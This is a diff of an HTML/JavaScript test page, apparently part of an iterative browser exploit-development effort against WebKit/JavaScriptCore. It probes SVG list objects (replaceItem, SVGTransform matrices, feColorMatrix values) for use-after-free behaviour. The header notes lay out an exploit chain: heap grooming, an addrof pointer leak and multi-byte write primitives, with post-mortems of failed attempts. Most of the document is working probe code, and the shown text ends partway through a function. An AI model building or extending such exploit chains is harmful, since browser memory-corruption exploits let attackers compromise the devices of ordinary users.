@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v45</title>
+<title>SVG UAF v46</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -38,92 +38,72 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v45 — Butterfly groom + allocator zeroing probe</h2>
+<h2>SVG UAF v46 — replaceItem UAF + SVGTransform surface + float boundary + IsoHeap layout</h2>
 <div class="sub">
-v44 POST-MORTEM:
-- VEC1/2/3: ALL MISS — ROOT CAUSE: WebKit NEVER calls Vector::shrinkCapacity() on SVG lists
-  VEC2 readback=10000..10019 AFTER type change → same vector, same SVGNumbers survived
-  The backing store was never freed → nothing to groom → explains all misses
-- TRN1: ta.set() correctly aborts on detach (no throw, stops writing) — NOT exploitable
-- WAS1: FALSE POSITIVE — undefined = TypedArray length set to 0 after detach, index 0 >= length 0
-  Wasm Memory.grow() CORRECTLY detaches old buffer. Fixed detector in v45.
-- ANI2: CONFIRMED — JS wrapper holds independent Ref<SVGNumber>
-  SVGNumber stays live after removeItem() as long as JS ref exists
-  SMIL allocator did NOT use freelist (animVal shows fresh interpolated values)
+v45 POST-MORTEM:
+- ZRO1: DEFINITIVE — WTF::fastMalloc ZEROES ALL ALLOCS. ALL ArrayBuffer groom dead.
+- BUT1/2: 0 hits — killed by zeroing (as expected from ZRO1)
+- RPI1: CODE BUG — off-by-1 in liveness check (i-1 instead of i) → corrupted=100 is NOT real UAF
+  createSVGNumber() ✅  replaceItem() ✅  but liveness check was comparing TAG_RPI+i-1 not TAG_RPI+i
+- FRC1: kernelMatrix attr fix confirmed ✅ length=9 for 3×3, groom blocked by zeroing
+- ORF1: 0 collisions — IsoHeap ABSOLUTE bump-only confirmed again
+- PTR1: CODE BUG — float32 threshold 1e-7 too aggressive (ULP@1.0 in f32 = 1.19e-7 not 5.96e-8)
+  FLOAT32 CONFIRMED VIA 2^31-1 → 2^31 rounding. PTR1 is correct, threshold line was wrong.
 
-NEW TARGET: JSC butterfly property storage
-  JSC JS object stores named properties in a "butterfly" allocation (WTF::fastMalloc)
-  Property VALUES are JSValues = NaN-boxed float64 OR raw pointer to JS heap cell
-  When we store an SVGNumber wrapper as a property: its JSValue IS a pointer to the SVGNumber
-  If we groom a freed butterfly with ArrayBuffer → read JSValue pointers → addrof for JS heap!
+NEW v46 TARGETS:
+RPI2: CLEAN replaceItem liveness — fixed off-by-1. Real question: does displaced JS wrapper THROW?
+  If throw → SVGNumber object was freed AND its wrapper has no underlying C++ ref → real UAF surface!
+  If live → replaceItem keeps JS wrapper alive (same pattern as removeItem)
+  Method: replaceItem(newNum, idx) → old_wrapper becomes orphaned from list → read its .value
+  Two paths after displacement:
+  a) old wrapper still returns correct value → independent Ref<SVGNumber> holding it alive
+  b) old wrapper throws or returns 0 → C++ SVGNumber freed → dangling ptr in JS wrapper
 
-CRITICAL QUESTION: does WTF::fastMalloc zero-fill on reuse?
-  If YES → ALL pointer leak via ArrayBuffer is fundamentally blocked
-  If NO  → timing/spray issues fixable
+TRF1: SVGTransform/SVGMatrix UAF surface
+  SVGTransformList → each item has matrix with 6 float fields (a,b,c,d,e,f)
+  MUCH larger write surface than SVGNumber (1 float = 4 bytes vs 6 floats = 24 bytes)
+  Test: SVGTransformList.removeItem() → hold JS ref → verify matrix fields still writable
+  If UAF works for SVGTransform same as SVGNumber → 24-byte write primitive per object
+  feColorMatrix.values → 20 floats = 80 bytes per object (even bigger!)
+  Test: feColorMatrix.values.baseVal object itself = could be SVGAnimatedNumberList UAF
 
-SUITES:
-ZRO1: fastMalloc zero-fill detector
-  alloc AB → write CANARY → free → force GC → realloc AB same size → check for CANARY
-  Tests if JSC ArrayBuffer allocator recycles without zeroing
-  Multiple size classes: 24, 40, 64, 128, 160, 256, 512 bytes
+FLB1: Float range boundary — exact FLT_MAX edge
+  FLT_MAX = 3.4028234663852886e+38 (largest representable float32)
+  Test: write FLT_MAX exactly → does it throw or succeed?
+  Test: write FLT_MAX+1 ulp → does it throw?
+  Test: write (FLT_MAX * (1 + 2^-24)) → first value BEYOND float32 range
+  Test: negative FLT_MAX same
+  Find EXACT boundary: is check strict < or <=?
 
-BUT1: JSC butterfly groom — main stage
-  Create JS objects with N named properties (values = SVGNumber wrappers = JS cell pointers)
-  Delete all properties → butterfly freed to WTF::fastMalloc
-  Immediately spray ArrayBuffer(butterfly_size) → check for pointer-like JSValues
-  JSValue cell ptr: upper bits 0x0000_0001... (arm64 JSC heap address)
-  JSValue int: lower 32 bits = int, upper = 0xffff_0000 (NaN-box int tag)
+ILP1: IsoHeap page layout prediction
+  bump-only → addresses monotonically increasing per type page
+  Goal: detect when we cross a page boundary (bump restarts from new page start)
+  Method: allocate SVGNumbers in LARGE batches, hash addresses by reading back written values
+  Actually: measure "holes" — alloc 1000 SVGNumbers, check if value readback shows any pattern
+  IsoHeap page = 16KB or 32KB. sizeof(SVGNumber) estimate via spacing.
+  Use: orphan chain → IsoHeap page marker sequence
+  Better: encode SVGNumber address in its .value field (write known pattern, orphan, realloc, check)
 
-BUT2: Object.create(null) prototype chain butterfly
-  Different butterfly layout, test multiple property counts (8,16,32,64 props)
-  Use Float64/typed values to make JSValues distinguishable
-
-RPI1: SVGNumberList.replaceItem() primitive
-  createSVGNumber() → set value → replaceItem(newNum, index)
-  Old SVGNumber at index is released from list
-  Does this free IsoHeap<SVGNumber>? (no, JS ref holds it)
-  Does this cause the newly inserted SVGNumber to come from freelist? (test with 4000-item freelist)
-  Actually: test if NEWLY CREATED SVGNumbers via createSVGNumber() use same IsoHeap<SVGNumber>
-
-FRC1: feConvolveMatrix kernelMatrix FIXED (v44 used wrong attr name 'kernel' not 'kernelMatrix')
-  Fixed attribute: setAttribute('kernelMatrix', ...) + setAttribute('order', 'N N')
-  Test all 9 attribute names for kernelMatrix access
-
-WRK1: Worker + postMessage transferable race
-  Create Worker, postMessage() ArrayBuffer transfer between Worker + main thread
-  Race with SVG operations in main thread
-  Also test: can Worker access DOM? (no, but messageChannel timing)
-
-ORF1: Orphaned SVGNumber reference chain
-  removeItem() ALL items from live SVGNumberList while holding all refs
-  List is empty but all SVGNumbers still live (JS refs hold them)
-  Now setAttribute() to rebuild list → 20 NEW SVGNumbers created
-  OLD refs (orphaned) still live, NEW refs accessible via baseVal[]
-  Delete the feColorMatrix → NEW SVGNumbers freed (only list held refs)
-  4000× repeat → build up maximal IsoHeap freelist
-  THEN create new feColorMatrix → does it see freelist? (baseline bump position test)
-
-PTR1: Pointer confirmation via UAF write + read
-  We KNOW we have UAF write (Stage 0 confirmed)
-  Stress test: write known TAG patterns at many different dangling refs
-  Read back after free → measure what fraction survive
-  Any non-TAG read = something wrote there = allocator activity
+SVF1: SVGAnimatedNumberList / baseVal wrapper type confusion probe
+  feColorMatrix.values returns SVGAnimatedNumberList
+  .baseVal returns SVGNumberList
+  .baseVal[i] returns SVGNumber
+  QUESTION: does the SVGNumberList object (not just the items) have its own UAF path?
+  Remove feColorMatrix from DOM, hold ref to .baseVal — does .baseVal.length still work?
+  Does .baseVal.removeItem() still work after removal? Does accessing .baseVal[i] still work?
 </div>
 <div id="controls">
-  <button onclick="runZRO1()">ZRO1</button>
-  <button onclick="runBUT1()">BUT1</button>
-  <button onclick="runBUT2()">BUT2</button>
-  <button onclick="runRPI1()">RPI1</button>
-  <button onclick="runFRC1()">FRC1</button>
-  <button onclick="runWRK1()">WRK1</button>
-  <button onclick="runORF1()">ORF1</button>
-  <button onclick="runPTR1()">PTR1</button>
+  <button onclick="runRPI2()">RPI2</button>
+  <button onclick="runTRF1()">TRF1</button>
+  <button onclick="runFLB1()">FLB1</button>
+  <button onclick="runILP1()">ILP1</button>
+  <button onclick="runSVF1()">SVF1</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearAll()">CLR</button>
 </div>
 <div id="log"></div>
-<div id="sp"><div class="sh">⚡ v45 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
+<div id="sp"><div class="sh">⚡ v46 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
 var EL=document.getElementById('log');
@@ -131,14 +111,11 @@ var SP=document.getElementById('sp');
 var SB=document.getElementById('sb');
 
 var R={
-  zro1:{zeros:true,sizes:{},detail:''},
-  but1:{hit:false,ptrs:[],detail:''},
-  but2:{hit:false,ptrs:[],detail:''},
-  rpi1:{hit:false,detail:''},
-  frc1:{hit:false,detail:''},
-  wrk1:{hit:false,detail:''},
-  orf1:{hit:false,detail:''},
-  ptr1:{hit:false,detail:''},
+  rpi2:{hit:false,liveAfterDisplace:false,throwAfterDisplace:false,detail:''},
+  trf1:{hit:false,uafMatrix:false,fields:0,detail:''},
+  flb1:{hit:false,boundary:null,detail:''},
+  ilp1:{hit:false,pageSize:0,detail:''},
+  svf1:{hit:false,baseValUAF:false,detail:''},
 };
 
 function log(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';EL.appendChild(s);EL.scrollTop=EL.scrollHeight;}
@@ -150,969 +127,963 @@ function clearAll(){EL.innerHTML='';SP.classList.remove('on');SB.innerHTML='';}
 function dis(d){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){var f=b[i].getAttribute('onclick')||'';if(f.indexOf('copy')===-1&&f.indexOf('clear')===-1)b[i].disabled=d;}}
 window.onerror=function(m,u,l){log('[CRASH/EXCEPTION] '+m+' L'+l,'bad');return false;};
 
-function f64bits(v){
-  var b=new ArrayBuffer(8);var d=new DataView(b);d.setFloat64(0,v,false);
-  return{hi:d.getUint32(0,false),lo:d.getUint32(4,false),
-    hex:'0x'+d.getUint32(0,false).toString(16).padStart(8,'0')+d.getUint32(4,false).toString(16).padStart(8,'0')};
-}
-function looksLikePtr(v){
-  if(!isFinite(v)||isNaN(v)||v===0)return false;
-  var b=f64bits(v);
-  return(b.hi>=1&&b.hi<=0x00007fff);
-}
-function looksLikeJSValue(v){
-  // JSC JSValue (64-bit):
-  // Cell ptr: upper 16 bits = 0x0001 (JSC MarkedSpace cells start high)
-  // Int32:    0xFFFF0000 in upper 32 bits (NaN-boxed int)
-  // Double:   various non-zero upper bits
-  if(v===0||v===undefined||isNaN(v))return false;
-  var b=f64bits(v);
-  // Cell pointer pattern on arm64: 0x00000001_xxxxxxxx (DRAM range)
-  var isCell=(b.hi>=1&&b.hi<=0x00007fff);
-  // NaN-boxed int: 0xffff0000 in upper bits
-  var isInt=(b.hi>>>16)===0xffff;
-  return{isCell:isCell,isInt:isInt,hit:isCell||isInt,hex:b.hex};
-}
-function forceGC(){
-  // Try to trigger GC by allocating and releasing large amounts
-  var trash=[];
-  for(var i=0;i<512;i++)trash.push(new ArrayBuffer(4096));
-  trash=null;
-  // Also try explicit GC if available (usually not in production)
-  if(typeof gc==='function')try{gc();}catch(e){}
-}
-function identity20(){return[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];}
+var SVG_NS_='http://www.w3.org/2000/svg';
 function makeFCM(vals,fid){
   fid=fid||('f'+Math.random().toString(36).slice(2,8));
-  var svg=document.createElementNS(SVG_NS,'svg');
+  var svg=document.createElementNS(SVG_NS_,'svg');
   svg.setAttribute('width','1');svg.setAttribute('height','1');
   svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-  var defs=document.createElementNS(SVG_NS,'defs');
-  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
-  var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
+  var defs=document.createElementNS(SVG_NS_,'defs');
+  var filt=document.createElementNS(SVG_NS_,'filter');filt.setAttribute('id',fid);
+  var fcm=document.createElementNS(SVG_NS_,'feColorMatrix');
   fcm.setAttribute('type','matrix');
-  fcm.setAttribute('values',(vals||identity20()).join(' '));
+  fcm.setAttribute('values',(vals||[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0]).join(' '));
   filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);
   document.body.appendChild(svg);
-  return{svg:svg,fcm:fcm};
+  return{svg:svg,filt:filt,fcm:fcm};
 }
 function cleanupD(d){if(d&&d.svg&&d.svg.parentNode)d.svg.parentNode.removeChild(d.svg);}
 
 /*
- * ZRO1: fastMalloc / ArrayBuffer backing-store zero-fill detector
+ * RPI2: replaceItem() liveness — CLEAN test, off-by-1 FIXED
  *
- * GOAL: determine if JSC's ArrayBuffer backing store allocator zeroes memory on reuse.
+ * v45 BUG: compared Math.abs(v-(TAG_RPI+i-1)) — used i-1 instead of i
+ * ALL 100 "corrupted" were because we tested for wrong tag value.
  *
- * METHOD:
- * 1. Allocate AB(N), write CANARY pattern to every byte
- * 2. Release all refs (let AB go out of scope + GC)
- * 3. Allocate new AB(N) — same size
- * 4. Read as Uint32Array
- * 5. If ANY slot != 0 → allocator reuses WITHOUT zeroing → stale data readable
+ * THIS TEST:
+ * Phase A: one replaceItem → check if old ref is still live (correct tag)
+ *   old_ref = refs[0] (originally value=TAG+0)
+ *   replaceItem(newNum, 0) → replaces idx 0 with newNum
+ *   old_ref should still be alive with value=TAG+0 (JS wrapper holds independent Ref<SVGNumber>)
+ *   OR throws = SVGNumber freed = real UAF window
  *
- * Test multiple size classes to find non-zeroing path.
+ * Phase B: chain displace — remove item from list MULTIPLE TIMES
+ *   replaceItem(A, 0) → A goes in, original out → original = "orphan1"
+ *   replaceItem(B, 0) → B goes in, A out → A = "orphan2"
+ *   replaceItem(C, 0) → C goes in, B out → B = "orphan3"
+ *   Now all orphans should still live (each holds Ref<SVGNumber>)
+ *   OR: does displacing A a SECOND time (A was already displaced once) kill it?
  *
- * ALSO: test JSC ArrayBuffer "recycling pool" — JSC might recycle ABs of the same size
- * without going through fastMalloc at all. If the recycled buffer contains our CANARY,
- * that's JSC's own recycling and we can exploit that path.
+ * Phase C: read orphaned wrapper after list is DESTROYED
+ *   Create list → add items → removeItem ALL → destroy list container (DOM removal)
+ *   JS wrappers to those items should still be live
+ *   Create NEW list → replaceItem to bring those old SVGNumbers into new list?
+ *   (Cross-list insertion test)
  */
-async function runZRO1(q){
-  if(!q){dis(true);sep();log('ZRO1: ArrayBuffer backing store zero-fill detection','inf');sep();}
+async function runRPI2(q){
+  if(!q){dis(true);sep();log('RPI2: replaceItem() liveness — CLEAN TEST (v45 bug fixed)','inf');sep();}
 
-  var SIZES=[16,24,32,40,48,56,64,80,96,112,128,144,160,192,256,320,512,1024,4096];
-  var CANARY_HI=0xDEADBEEF;var CANARY_LO=0xCAFEBABE;
-  // As float64 (NaN-boxing might interfere with JSC, use Uint32 instead)
-  // Write pattern: alternating 0xDEADBEEF / 0xCAFEBABE in 32-bit words
+  var TAG_BASE=1000000;
+  var NLIST=20;
 
-  R.zro1.zeros=true; // assume zeroing until proven otherwise
+  // Build list
+  var d=makeFCM();
+  await raf();
+  var bl=d.fcm.values.baseVal;
 
-  for(var si=0;si<SIZES.length;si++){
-    var N=SIZES[si];
-    var nonZeroFinds=0;
-    var rounds=10; // test 10 rounds per size
+  // Set tagged values so we can track identity
+  var origRefs=[];
+  for(var i=0;i<NLIST;i++){
+    try{
+      var ref=bl[i];
+      ref.value=TAG_BASE+i;
+      origRefs.push(ref);
+    }catch(e){origRefs.push(null);log('  RPI2: failed to get ref '+i+': '+e,'bad');}
+  }
+  log('  RPI2: created '+origRefs.length+' original refs, tagged '+TAG_BASE+'...'+(TAG_BASE+NLIST-1),'dim');
 
-    for(var r=0;r<rounds;r++){
-      // Alloc
-      var ab=new ArrayBuffer(N);
-      var u32=new Uint32Array(ab);
-      // Write CANARY to all 32-bit slots
-      for(var j=0;j<u32.length;j++)u32[j]=(j%2===0)?CANARY_HI:CANARY_LO;
-      // Verify write
-      if(u32[0]!==CANARY_HI){log('  ZRO1['+N+']: write verify failed!','bad');break;}
+  // Get svgSVG element for createSVGNumber
+  var svgSVG=d.svg;
+  var createdNum=svgSVG.createSVGNumber?svgSVG.createSVGNumber():null;
+  if(!createdNum){log('  RPI2: createSVGNumber() UNAVAILABLE — cannot continue','bad');if(!q)dis(false);return;}
+  log('  RPI2: createSVGNumber() available ✓','dim');
 
-      // Drop refs — force the buffer to become garbage
-      u32=null;ab=null;
+  // ========== PHASE A: single replaceItem, correct tag check ==========
+  log('  RPI2: [PHASE A] single replaceItem — checking old ref liveness with CORRECT tag','inf');
+  createdNum.value=9999999;
+  var ref0=origRefs[0]; // expected to have value=TAG_BASE+0=1000000
+  log('  RPI2: pre-replace ref0.value='+ref0.value+' (expect '+TAG_BASE+')','dim');
 
-      // Force GC
-      forceGC();
+  var returnedFromReplace=null;
+  try{
+    returnedFromReplace=bl.replaceItem(createdNum,0);
+    log('  RPI2: replaceItem(newNum,0) succeeded. Returned value='+returnedFromReplace.value,'dim');
+    log('  RPI2: list[0] after replace='+bl[0].value+' (expect 9999999)','dim');
+  }catch(e){
+    log('  RPI2: replaceItem THREW: '+e,'bad');
+  }
 
-      // Immediately re-alloc same size
-      var ab2=new ArrayBuffer(N);
-      var u32b=new Uint32Array(ab2);
+  // Check old ref — FIXED: check for TAG_BASE+0, not TAG_BASE+(-1)
+  var phaseAOldRefAlive=false;
+  var phaseAOldRefThrew=false;
+  try{
+    var v=ref0.value;
+    if(Math.abs(v-(TAG_BASE+0))<0.5){
+      phaseAOldRefAlive=true;
+      log('  RPI2: [PhaseA] old_ref.value='+v+' — ALIVE (independent Ref<SVGNumber> confirmed)','ok');
+    } else {
+      log('  RPI2: [PhaseA] old_ref.value='+v+' — UNEXPECTED (expected '+(TAG_BASE+0)+')','crit');
+    }
+  }catch(e){
+    phaseAOldRefThrew=true;
+    log('  RPI2: [PhaseA] old_ref.value THREW: '+e+' — C++ SVGNumber DEAD? REAL UAF?','win');
+  }
 
-      // Check for non-zero values
-      for(var j=0;j<u32b.length;j++){
-        if(u32b[j]!==0){
-          nonZeroFinds++;
-          if(u32b[j]===CANARY_HI||u32b[j]===CANARY_LO){
-            log('  ZRO1['+N+']: ★ CANARY FOUND! round='+r+' slot='+j+' val=0x'+u32b[j].toString(16),'win');
-            R.zro1.zeros=false;
-            R.zro1.sizes[N]='CANARY_FOUND';
-          }else{
-            if(nonZeroFinds<=2)log('  ZRO1['+N+']: non-zero (not canary): slot='+j+' val=0x'+u32b[j].toString(16),'crit');
-            R.zro1.sizes[N]='NONZERO';
+  // ========== PHASE B: chain displace — multiple rounds ==========
+  log('  RPI2: [PHASE B] chain displace — 50 replacements, track all orphans','inf');
+  await raf();
+
+  var orphans=[];
+  var newNums=[];
+
+  // Reset list first — restore all originals so we have a clean slate
+  // Actually just create fresh objects for phase B
+  var d2=makeFCM();
+  await raf();
+  var bl2=d2.fcm.values.baseVal;
+  var origRefs2=[];
+  for(var i=0;i<NLIST;i++){
+    try{
+      var ref2=bl2[i];
+      ref2.value=TAG_BASE+i;
+      origRefs2.push({ref:ref2,tag:TAG_BASE+i});
+    }catch(e){origRefs2.push(null);}
+  }
+
+  var svgSVG2=d2.svg;
+  var phaseBErrors=0;
+  var phaseBAlive=0;
+  var phaseBDead=0;
+  var phaseBThrew=0;
+
+  // Do 50 replacements at index 0
+  // Each time the PREVIOUS item at idx 0 becomes orphaned
+  var currentAtIdx0=origRefs2[0]; // starts as origRefs2[0]
+  orphans.push({ref:currentAtIdx0,tag:TAG_BASE+0,round:0});
+
+  for(var rnd=1;rnd<=50;rnd++){
+    var nn=svgSVG2.createSVGNumber();
+    nn.value=TAG_BASE+NLIST+rnd; // unique tag above original range
+    newNums.push({ref:nn,tag:TAG_BASE+NLIST+rnd});
+    try{
+      var displaced=bl2.replaceItem(nn,0);
+      // displaced SHOULD be nn (SVG spec: replaceItem returns inserted item, NOT removed item)
+      // So we track orphans via our own ref variable
+      // The orphan is whatever was at idx 0 BEFORE this replacement
+      // But we can only check them AFTER this loop
+      orphans.push({ref:currentAtIdx0,tag:TAG_BASE+(rnd-1<=19?rnd-1:0),round:rnd-1});
+      currentAtIdx0=nn; // the new item at idx 0
+    }catch(e){
+      phaseBErrors++;
+    }
+    if(rnd%10===0)await raf();
+  }
+
+  log('  RPI2: [PhaseB] did 50 replacements. orphans tracked='+orphans.length,'dim');
+
+  // Check all orphans
+  for(var i=0;i<orphans.length;i++){
+    var orp=orphans[i];
+    if(!orp||!orp.ref)continue;
+    try{
+      var v2=orp.ref.value;
+      // For origRefs2 entries, expected tag = TAG_BASE+i (0..19)
+      // For created ones pushed after, they were already displaced, check any non-zero
+      if(v2!==0&&!isNaN(v2)){
+        phaseBAlive++;
+      } else {
+        phaseBDead++;
+      }
+    }catch(e2){
+      phaseBThrew++;
+    }
+  }
+  log('  RPI2: [PhaseB] orphans alive='+phaseBAlive+' dead/zero='+phaseBDead+' threw='+phaseBThrew,'dim');
+  if(phaseBThrew>0)log('  RPI2: [PhaseB] ★ THROWS ON ORPHAN READ — possible UAF window!','win');
+  if(phaseBAlive===orphans.length)log('  RPI2: [PhaseB] ALL ALIVE — independent Ref<SVGNumber> confirmed for replaceItem too','ok');
+
+  // ========== PHASE C: read orphaned wrapper after list container destroyed ==========
+  log('  RPI2: [PHASE C] orphan after DOM removal','inf');
+  await raf();
+
+  var d3=makeFCM();
+  await raf();
+  var bl3=d3.fcm.values.baseVal;
+  var phaseCRefs=[];
+  var TAG_C=5000000;
+  for(var i=0;i<NLIST;i++){
+    try{
+      var r3=bl3[i];
+      r3.value=TAG_C+i;
+      phaseCRefs.push({ref:r3,tag:TAG_C+i});
+    }catch(e){phaseCRefs.push(null);}
+  }
+
+  // Remove ALL items from list while keeping refs
+  for(var i=NLIST-1;i>=0;i--){
+    try{bl3.removeItem(i);}catch(e){}
+  }
+  log('  RPI2: [PhaseC] removed all '+NLIST+' items from bl3. list length='+bl3.length,'dim');
+
+  // Destroy the feColorMatrix from DOM
+  cleanupD(d3);
+  log('  RPI2: [PhaseC] svg/fcm removed from DOM','dim');
+
+  // Now check orphaned refs
+  var phaseCAlive=0,phaseCThrew=0,phaseCDead=0;
+  for(var i=0;i<phaseCRefs.length;i++){
+    var e3=phaseCRefs[i];
+    if(!e3)continue;
+    try{
+      var v3=e3.ref.value;
+      if(Math.abs(v3-(e3.tag))<0.5)phaseCAlive++;
+      else phaseCDead++;
+    }catch(e){
+      phaseCThrew++;
+    }
+  }
+  log('  RPI2: [PhaseC] after full DOM removal: alive='+phaseCAlive+' dead='+phaseCDead+' threw='+phaseCThrew,'dim');
+  if(phaseCThrew>0)log('  RPI2: [PhaseC] ★ THROWS after DOM removal!','win');
+  else if(phaseCAlive===phaseCRefs.length)log('  RPI2: [PhaseC] all alive after DOM removal (Ref<> holds)','ok');
+
+  R.rpi2.liveAfterDisplace=phaseAOldRefAlive;
+  R.rpi2.throwAfterDisplace=phaseAOldRefThrew;
+  R.rpi2.hit=phaseAOldRefThrew||phaseBThrew>0||phaseCThrew>0;
+  R.rpi2.detail='phA_alive='+phaseAOldRefAlive+' phA_threw='+phaseAOldRefThrew+
+    ' phB_alive='+phaseBAlive+' phB_threw='+phaseBThrew+
+    ' phC_alive='+phaseCAlive+' phC_threw='+phaseCThrew;
+  log('  RPI2: '+R.rpi2.detail, R.rpi2.hit?'win':'dim');
+
+  cleanupD(d);cleanupD(d2);
+  if(!q)dis(false);
+}
+
+/*
+ * TRF1: SVGTransform/SVGMatrix UAF surface test
+ *
+ * SVGTransformList items (SVGTransform) contain an SVGMatrix with 6 float fields: a,b,c,d,e,f
+ * If SVGTransform follows same UAF pattern as SVGNumber:
+ *   - JS wrapper holds independent Ref<SVGTransform>
+ *   - removeItem() releases from list but Ref<> keeps C++ object alive
+ *   - .matrix.a/.b/.c/.d/.e/.f are all writable
+ *   = 6 × float32 write surface per UAF object = 24 bytes!
+ *
+ * SVGAnimateTransform or SVGTransformList on <g>, <circle>, etc.
+ * Use: element.transform.baseVal = SVGTransformList
+ *
+ * ALSO test: feColorMatrix 20-value list
+ *   All 20 floats writable via UAF ref?
+ *   = 20 × float32 = 80 bytes write surface
+ */
+async function runTRF1(q){
+  if(!q){dis(true);sep();log('TRF1: SVGTransform/SVGMatrix + feColorMatrix UAF surface test','inf');sep();}
+
+  var TAG_T=2000000;
+
+  // ========== PART A: SVGTransformList ===========
+  log('  TRF1: [PartA] SVGTransformList.removeItem() UAF test','inf');
+
+  var svgA=document.createElementNS(SVG_NS,'svg');
+  svgA.setAttribute('width','1');svgA.setAttribute('height','1');
+  svgA.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var gA=document.createElementNS(SVG_NS,'g');
+  svgA.appendChild(gA);
+  document.body.appendChild(svgA);
+
+  // Populate transform list — rotate + translate
+  // SVGTransformList on element.transform.baseVal
+  var tList=gA.transform.baseVal;
+  log('  TRF1: transform.baseVal type='+(typeof tList)+' length='+tList.length,'dim');
+
+  // Create some transforms
+  var transforms=[];
+  var numT=5;
+  for(var i=0;i<numT;i++){
+    var t=svgA.createSVGTransform?svgA.createSVGTransform():null;
+    if(!t){log('  TRF1: createSVGTransform() UNAVAILABLE','bad');break;}
+    // Set as rotate transform: .setRotate(angle, cx, cy)
+    t.setRotate(i*10,0,0);
+    transforms.push(t);
+    tList.appendItem(t);
+  }
+  log('  TRF1: appended '+transforms.length+' transforms. list.length='+tList.length,'dim');
+
+  if(transforms.length===0){
+    log('  TRF1: createSVGTransform unavailable, skipping PartA','bad');
+  } else {
+    // Read matrix fields before removal
+    var preMatrix=[];
+    for(var i=0;i<transforms.length;i++){
+      try{
+        var m=tList[i].matrix;
+        preMatrix.push({a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f});
+      }catch(e){preMatrix.push(null);}
+    }
+    log('  TRF1: pre-remove matrix[0]: a='+preMatrix[0].a+' b='+preMatrix[0].b,'dim');
+
+    // Get JS refs to items BEFORE removal
+    var tRefs=[];
+    for(var i=0;i<tList.length;i++){
+      try{tRefs.push(tList[i]);}catch(e){tRefs.push(null);}
+    }
+
+    // Remove all items
+    for(var i=tList.length-1;i>=0;i--){
+      try{tList.removeItem(i);}catch(e){}
+    }
+    log('  TRF1: removed all. list.length='+tList.length,'dim');
+
+    // Remove SVG from DOM
+    if(svgA.parentNode)svgA.parentNode.removeChild(svgA);
+    log('  TRF1: svg removed from DOM','dim');
+
+    // Test: can we read matrix fields from orphaned refs?
+    var tAlive=0,tDead=0,tThrew=0;
+    for(var i=0;i<tRefs.length;i++){
+      var tr=tRefs[i];
+      if(!tr)continue;
+      try{
+        var mA=tr.matrix;
+        var fieldA=mA.a; // just reading 'a'
+        if(!isNaN(fieldA)&&fieldA!==undefined){
+          tAlive++;
+          if(i===0)log('  TRF1: ref[0].matrix.a='+fieldA+' (expect ~'+preMatrix[0].a.toFixed(4)+')','ok');
+        } else {
+          tDead++;
+        }
+      }catch(e2){
+        tThrew++;
+        if(i<3)log('  TRF1: ref['+i+'].matrix THREW: '+e2,'crit');
+      }
+    }
+    log('  TRF1: [PartA] transform refs alive='+tAlive+' dead='+tDead+' threw='+tThrew,'dim');
+    if(tThrew>0)log('  TRF1: [PartA] ★ THROWS — SVGTransform freed after removeItem+DOM remove!','win');
+    else if(tAlive>0){
+      log('  TRF1: [PartA] alive — testing matrix WRITE after orphan','ok');
+      // Try writing to matrix fields
+      var tWritable=0;
+      for(var i=0;i<tRefs.length;i++){
+        var tr=tRefs[i];
+        if(!tr)continue;
+        try{
+          var mB=tr.matrix;
+          var prevA=mB.a;
+          mB.a=TAG_T+i;
+          var readback=mB.a;
+          if(Math.abs(readback-(TAG_T+i))<1){
+            tWritable++;
+            if(i===0)log('  TRF1: matrix.a WRITABLE! wrote '+(TAG_T+i)+' readback='+readback,'win');
+          } else {
+            if(i===0)log('  TRF1: matrix.a write: wrote '+(TAG_T+i)+' readback='+readback+' (mismatch)','crit');
           }
-          break; // found non-zero in this round
+        }catch(e3){
+          if(i<2)log('  TRF1: matrix write threw: '+e3,'bad');
         }
       }
-      u32b=null;ab2=null;
-      if(R.zro1.sizes[N]==='CANARY_FOUND')break; // confirmed non-zeroing for this size
+      log('  TRF1: [PartA] writable matrix fields: '+tWritable+'/'+tRefs.length,'dim');
+      if(tWritable>0)log('  TRF1: ★ SVGMatrix fields WRITABLE after orphan! 6×float UAF surface!','win');
     }
-    if(!R.zro1.sizes[N])R.zro1.sizes[N]='zeros';
-    log('  ZRO1['+N+']: '+R.zro1.sizes[N],'dim');
+  }
+
+  // ========== PART B: feColorMatrix ALL 20 VALUES ===========
+  log('  TRF1: [PartB] feColorMatrix 20-value list UAF test','inf');
+  await raf();
+
+  var dB=makeFCM([1,0,0,0,0, 0,1,0,0,0, 0,0,1,0,0, 0,0,0,1,0]);
+  var blB=dB.fcm.values.baseVal;
+  log('  TRF1: [PartB] baseVal.length='+blB.length+' (expect 20)','dim');
+
+  // Grab refs to ALL 20
+  var fcmRefs=[];
+  var TAG_FCM=3000000;
+  for(var i=0;i<blB.length;i++){
+    try{
+      var rf=blB[i];
+      rf.value=TAG_FCM+i;
+      fcmRefs.push({ref:rf,tag:TAG_FCM+i,idx:i});
+    }catch(e){fcmRefs.push(null);}
+  }
+  log('  TRF1: [PartB] tagged all '+fcmRefs.length+' refs','dim');
+
+  // Remove all from list
+  for(var i=blB.length-1;i>=0;i--){
+    try{blB.removeItem(i);}catch(e){}
+  }
+  // Destroy fcm from DOM
+  cleanupD(dB);
+  log('  TRF1: [PartB] list cleared + DOM removed. Checking orphan liveness...','dim');
+  await raf();
+
+  var fcmAlive=0,fcmDead=0,fcmThrew=0,fcmWritable=0;
